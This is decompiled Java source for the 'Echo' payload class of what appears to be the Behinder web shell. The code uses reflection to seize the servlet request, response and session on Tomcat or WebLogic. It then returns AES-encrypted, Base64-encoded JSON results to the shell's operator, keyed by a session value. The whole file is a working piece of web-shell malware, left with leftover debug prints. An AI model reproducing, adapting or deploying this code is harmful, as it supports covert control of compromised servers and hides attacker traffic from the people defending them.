//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package net.rebeyond.behinder.payload.java;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Echo {
    public static String content;
    private Object Request;
    private Object Response;
    private Object Session;

    public Echo() {
    }

    public void test_getOutputStream(HashMap result) throws Exception {
        Class clazz = this.Response.getClass();
        System.out.println(clazz);
        if (clazz.toString().equals("class org.apache.catalina.connector.ResponseFacade")) {
            System.out.println("is tomcat");
            Field field_response = this.Response.getClass().getDeclaredField("response");
            field_response.setAccessible(true);
            Object res = field_response.get(this.Response);
            Field field_usingWriter = res.getClass().getDeclaredField("usingWriter");
            field_usingWriter.setAccessible(true);
            if (field_usingWriter.getBoolean(res)) {
                System.out.println("invoke flushBuffer() && set usingWriter=false");
                this.Response.getClass().getMethod("flushBuffer").invoke(this.Response);
                field_usingWriter.setBoolean(res, false);
            }
        } else if (clazz.toString().equals("class weblogic.servlet.internal.ServletResponseImpl")) {
            System.out.println("is weblogic");
            Method method = this.Response.getClass().getDeclaredMethod("resetOutputState");
            method.setAccessible(true);
            method.invoke(this.Response);
        } else {
            System.out.println("i don't know");
        }

        Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
        Method write = so.getClass().getMethod("write", byte[].class);
        System.out.println("result json:");
        System.out.println(this.buildJson(result, true));
        write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
        so.getClass().getMethod("flush").invoke(so);
        so.getClass().getMethod("close").invoke(so);
    }

    public boolean equals(Object obj) {
        System.out.println("invoke Echo.eval()");
        HashMap result = new HashMap();
        boolean var13 = false;

        label95: {
            try {
                var13 = true;
                this.fillContext(obj);
//                result.put("status", "success");
                result.put("msg", content);
                var13 = false;
                break label95;
            } catch (Exception var19) {
                result.put("msg", var19.getMessage());
//                result.put("status", "success");
                var13 = false;
            } finally {
                if (var13) {
                    try {
                        this.test_getOutputStream(result);
                    } catch (Exception var16) {
                    }
                }

            }

            try {
                this.test_getOutputStream(result);
            } catch (Exception var17) {
            }

            return true;
        }

        try {
            this.test_getOutputStream(result);
        } catch (Exception var18) {
        }

        return true;
    }

    public boolean e(Object r, Object w) {
        System.out.println("invoke Echo.e()");
        HashMap result = new HashMap();
        boolean var13 = false;

        label95: {
            try {
                var13 = true;
                this.Request = r;
                this.Response = w;
                this.Session = r.getClass().getMethod("getSession").invoke(r);
                this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
//                result.put("status", "success");
                result.put("msg", content);
                var13 = false;
                System.out.println("111");
                break label95;
            } catch (Exception var20) {
                System.out.println("222");
                result.put("msg", var20.getMessage());
//                result.put("status", "success");
                var13 = false;
            } finally {
                System.out.println("333");
                if (var13) {
                    try {
                        this.test_getOutputStream(result);
                    } catch (Exception var17) {
                        var17.printStackTrace();
                    }
                }

            }

            try {
                this.test_getOutputStream(result);
            } catch (Exception var18) {
            }

            return true;
        }

        try {
            System.out.println("777");
            System.out.println("---start---");
            this.test_getOutputStream(result);
            System.out.println("---end---");
        } catch (Exception var19) {
        }

        return true;
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        Iterator var5 = entity.keySet().iterator();

        while(var5.hasNext()) {
            String key = (String)var5.next();
            sb.append("\"" + key + "\":\"");
            String value = ((String)entity.get(key)).toString();
            if (encode) {
                Class Base64;
                Object Encoder;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }

        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }

        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
            this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
            this.Session = obj.getClass().getMethod("getSession").invoke(obj);
        } else {
            Map<String, Object> objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }

        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
}
